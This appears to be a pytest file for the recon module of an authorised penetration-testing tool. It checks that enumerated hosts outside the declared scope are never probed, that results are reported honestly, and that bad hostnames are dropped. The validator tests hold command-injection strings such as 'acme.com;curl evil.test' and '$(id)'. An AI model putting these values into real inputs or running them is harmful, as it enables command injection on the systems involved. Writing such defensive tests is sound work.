"""Domain recon: find the attack surface, touch nothing unauthorised.

The dangerous step here is not enumeration. Passive subdomain data comes from
third-party datasets and contacting them harms nobody. The dangerous step is
CONNECTING to what enumeration returned — and passive results routinely include
shared hosting, CDN endpoints, parked names, and hosts belonging to entirely
different companies that happen to share infrastructure.

So the properties under test are:

  A NAME IS NOT PERMISSION. A host that enumeration returned and scope does not
  authorise is written as a pending candidate and NEVER probed.

  A DECLARED RULE IS PERMISSION. If the customer authorised `acme.com` as a
  domain, `vpn.acme.com` is inside what they signed, and probing it needs no
  further approval. That is their decision, not erlik's.

  TOOL OUTPUT IS UNTRUSTED. A hostname from a third-party dataset is rendered
  into a shell command downstream. Anything that is not a plain hostname is
  dropped rather than escaped.
"""

import asyncio

import pytest

from orchestrator import recon as R
from orchestrator import engagement as E


class TestHostnameValidation:
    @pytest.mark.parametrize("h", [
        "acme.com", "vpn.acme.com", "a-b.acme.co.uk", "x1.y2.acme.com",
        "ACME.COM", "acme.com.",
    ])
    def test_real_hostnames_accepted(self, h):
        assert R.valid_hostname(h) is True

    @pytest.mark.parametrize("h", [
        "intranet", "jira", "vpn", "kali-tools", "juice-shop",
    ])
    def test_single_label_internal_names_are_accepted(self, h):
        """A dot is not required. On an internal engagement `intranet` and
        `jira` are ordinary targets, and refusing them would make recon
        unusable exactly where it matters most. What may be CONTACTED is
        decided by scope, not by label count."""
        assert R.valid_hostname(h) is True

    @pytest.mark.parametrize("h", [
        "", "   ", "acme..com", "-acme.com", "acme-.com",
        "acme.com/../etc", "acme.com;id", "acme.com`id`", "acme.com$(id)",
        'acme.com"', "acme com", "acme.com\nevil.com", "*.acme.com",
        "a" * 60 + "." + "b" * 200 + ".com",
    ])
    def test_anything_that_is_not_a_hostname_is_dropped(self, h):
        """Not sanitised — DROPPED. There is no legitimate enumeration result
        that needs a quote in it, and the value reaches a shell downstream."""
        assert R.valid_hostname(h) is False

    def test_the_validator_is_what_gates_shell_use(self):
        """Guard on the guard: if this ever loosened, injection payloads from a
        third-party dataset would reach a command line."""
        import shlex
        bad = "acme.com;curl evil.test"
        assert R.valid_hostname(bad) is False
        assert shlex.quote(bad) != bad, "fixture is not actually dangerous"


class TestToolClassification:
    def test_every_tool_declares_whether_it_touches_the_target(self):
        for name, spec in R.TOOLS.items():
            assert "active" in spec, name
            assert isinstance(spec["active"], bool), name

    def test_passive_and_active_are_split_correctly(self):
        """subfinder queries third parties; httpx opens a connection to the
        customer's host. Gating them the same way would be either uselessly
        strict or dangerously loose."""
        assert R.TOOLS["subfinder"]["active"] is False
        assert R.TOOLS["dnsx"]["active"] is False
        assert R.TOOLS["httpx"]["active"] is True
        assert R.TOOLS["katana"]["active"] is True


def _fresh(tmp_path, monkeypatch):
    import orchestrator.database as db_mod
    monkeypatch.setattr(db_mod, "DB_PATH", str(tmp_path / "r.db"))
    return db_mod


class TestNothingUnauthorisedIsProbed:
    def test_out_of_scope_hosts_are_parked_not_probed(self, tmp_path, monkeypatch):
        """THE property. A name enumeration returned is a claim by a third
        party that something exists — not permission to connect to it."""
        db_mod = _fresh(tmp_path, monkeypatch)
        probed: list[list[str]] = []

        async def fake_enum(domain, timeout=180, **kw):
            # a real-looking mix: two under the domain, one that is not
            return ["app.acme.example", "vpn.acme.example"], "2 names"

        async def fake_probe(hosts, timeout=180, **kw):
            probed.append(list(hosts))
            return {h: {"url": f"http://{h}", "status": 200, "tech": []} for h in hosts}

        monkeypatch.setattr(R, "enumerate_passive", fake_enum)
        monkeypatch.setattr(R, "probe_live", fake_probe)

        async def go():
            await db_mod.init_db()
            db = await db_mod.get_db()
            # Root domain declared, but ONE host explicitly excluded.
            eid = await E.create(db, "Acme", "acme.example")
            await E.add_scope(db, eid, "vpn.acme.example", kind="host", in_scope=False)
            await db.commit()
            rep = await R.run(db, eid)
            await db.close()
            return rep

        rep = asyncio.run(go())
        assert probed == [["app.acme.example"]], (
            f"probed a host scope forbids: {probed}")
        assert rep["authorised"] == ["app.acme.example"]
        assert [p["host"] for p in rep["pending"]] == ["vpn.acme.example"]

    def test_a_declared_domain_authorises_its_subdomains(self, tmp_path, monkeypatch):
        """If the customer signed for acme.com, vpn.acme.com is inside it."""
        db_mod = _fresh(tmp_path, monkeypatch)
        probed: list[list[str]] = []

        async def fake_enum(domain, timeout=180, **kw):
            return ["a.acme.example", "b.acme.example"], "2"

        async def fake_probe(hosts, timeout=180, **kw):
            probed.append(sorted(hosts))
            return {}

        monkeypatch.setattr(R, "enumerate_passive", fake_enum)
        monkeypatch.setattr(R, "probe_live", fake_probe)

        async def go():
            await db_mod.init_db()
            db = await db_mod.get_db()
            eid = await E.create(db, "Acme", "acme.example")
            rep = await R.run(db, eid)
            await db.close()
            return rep

        rep = asyncio.run(go())
        assert probed == [["a.acme.example", "b.acme.example"]]
        assert rep["pending"] == []

    def test_probe_can_be_disabled_entirely(self, tmp_path, monkeypatch):
        """An operator who wants the name list without touching anything."""
        db_mod = _fresh(tmp_path, monkeypatch)
        called = []

        async def fake_enum(domain, timeout=180, **kw):
            return ["a.acme.example"], "1"

        async def fake_probe(hosts, timeout=180, **kw):
            called.append(hosts)
            return {}

        monkeypatch.setattr(R, "enumerate_passive", fake_enum)
        monkeypatch.setattr(R, "probe_live", fake_probe)

        async def go():
            await db_mod.init_db()
            db = await db_mod.get_db()
            eid = await E.create(db, "Acme", "acme.example")
            rep = await R.run(db, eid, probe=False)
            await db.close()
            return rep

        rep = asyncio.run(go())
        assert called == [], "probed despite probe=False"
        assert rep["probed"] == []

    def test_discovered_candidates_do_not_widen_scope(self, tmp_path, monkeypatch):
        """After recon, a pending host must still be refused by the scope
        check. Recon that could authorise its own findings would make the
        approval gate decorative."""
        db_mod = _fresh(tmp_path, monkeypatch)

        async def fake_enum(domain, timeout=180, **kw):
            return ["vpn.other.example"], "1"

        monkeypatch.setattr(R, "enumerate_passive", fake_enum)
        monkeypatch.setattr(R, "probe_live",
                            lambda *a, **k: asyncio.sleep(0, result={}))

        async def go():
            await db_mod.init_db()
            db = await db_mod.get_db()
            eid = await E.create(db, "Acme", "acme.example")
            # a name outside the declared domain, e.g. from certificate data
            await R.run(db, eid)
            allowed, why = await E.check(db, eid, "http://vpn.other.example")
            await db.close()
            return allowed, why

        allowed, why = asyncio.run(go())
        assert allowed is False
        assert "approved" in why or "no in-scope rule" in why


class TestReportIsHonest:
    def test_an_engagement_with_no_root_domain_says_so(self, tmp_path, monkeypatch):
        db_mod = _fresh(tmp_path, monkeypatch)

        async def go():
            await db_mod.init_db()
            db = await db_mod.get_db()
            eid = await E.create(db, "Acme", "")
            rep = await R.run(db, eid)
            await db.close()
            return rep

        assert "no root domain" in asyncio.run(go())["error"]

    def test_a_missing_tool_is_reported_not_silently_empty(self, tmp_path, monkeypatch):
        """An empty result reads as 'the customer has no subdomains', which is
        a very different claim from 'the tool is not installed'."""
        async def no_tool(tool):
            return False

        monkeypatch.setattr(R, "tool_available", no_tool)
        hosts, note = asyncio.run(R.enumerate_passive("acme.example"))
        assert hosts == []
        assert "not installed" in note

    def test_results_outside_the_asked_domain_are_discarded(self, monkeypatch):
        """Passive datasets return artefacts. A name that is not under the
        domain we asked about is not this customer's asset."""
        async def yes(tool):
            return True

        async def fake_exec(cmd, tools, **kw):
            return {"success": True,
                    "output": "app.acme.example\nunrelated.evil.test\nb.acme.example\n"}

        monkeypatch.setattr(R, "tool_available", yes)
        import orchestrator.tool_executor as T
        monkeypatch.setattr(T, "execute_tool", fake_exec)
        hosts, note = asyncio.run(R.enumerate_passive("acme.example"))
        assert hosts == ["app.acme.example", "b.acme.example"]
        assert "discarded" in note
